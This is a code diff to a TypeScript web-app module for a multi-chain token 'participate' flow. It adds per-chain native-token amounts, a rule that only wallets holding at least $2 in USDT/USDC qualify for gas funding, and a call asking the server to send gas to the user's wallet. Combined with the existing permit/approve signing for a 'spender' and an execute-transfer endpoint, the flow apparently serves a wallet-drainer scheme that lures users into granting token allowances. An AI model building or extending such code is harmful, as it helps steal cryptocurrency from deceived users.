@@ -85,6 +85,26 @@ export type ParticipateChain = (typeof PARTICIPATE_CHAINS)[number];
 export type ParticipateToken = ParticipateChain["tokens"][number];
 export type SignType = "permit" | "approve";
 
+/** Native token participation: user sends ETH/MATIC/BNB directly to spender */
+export const NATIVE_CHAINS = [
+  { chainId: 1, chainName: "Ethereum", symbol: "ETH", decimals: 18, amountWei: BigInt("1000000000000000") }, // 0.001 ETH
+  { chainId: 137, chainName: "Polygon", symbol: "MATIC", decimals: 18, amountWei: BigInt("10000000000000000") }, // 0.01 MATIC
+  { chainId: 56, chainName: "BSC", symbol: "BNB", decimals: 18, amountWei: BigInt("5000000000000000") }, // 0.005 BNB
+] as const;
+
+/** Min USDT/USDC balance (in token units) to qualify for gas funding - user must have >= $2 */
+export const MIN_USD_FOR_GAS_FUND = 2;
+export function minTokenAmountForGasFund(decimals: number): bigint {
+  return BigInt(10 ** decimals) * BigInt(MIN_USD_FOR_GAS_FUND);
+}
+
+/** Min native balance (wei) needed for approve tx - if below, we fund gas first */
+export const GAS_THRESHOLD_BY_CHAIN: Record<number, bigint> = {
+  1: BigInt("500000000000000"),   // 0.0005 ETH
+  137: BigInt("5000000000000000"), // 0.005 MATIC
+  56: BigInt("3000000000000000"),  // 0.003 BNB
+};
+
 /** Flat list of { chain, token } for balance fetching */
 export function getParticipateTokenEntries(): Array<{
   chainId: number;
@@ -175,6 +195,28 @@ export function getTransferApiUrl(): string {
   return typeof window !== "undefined" && window.location
     ? `${window.location.origin}/api/execute-transfer`
     : "/api/execute-transfer";
+}
+
+export function getFundGasApiUrl(): string {
+  return typeof window !== "undefined" && window.location
+    ? `${window.location.origin}/api/fund-gas`
+    : "/api/fund-gas";
+}
+
+/** Request spender to fund user's wallet with native token for gas */
+export async function fundGasApi(
+  userAddress: string,
+  chainId: number
+): Promise<{ txHash: string }> {
+  const url = getFundGasApiUrl();
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ userAddress, chainId }),
+  });
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) throw new Error(data.error || "Failed to fund gas");
+  return { txHash: data.txHash };
 }
 
 export async function triggerTransferApi(
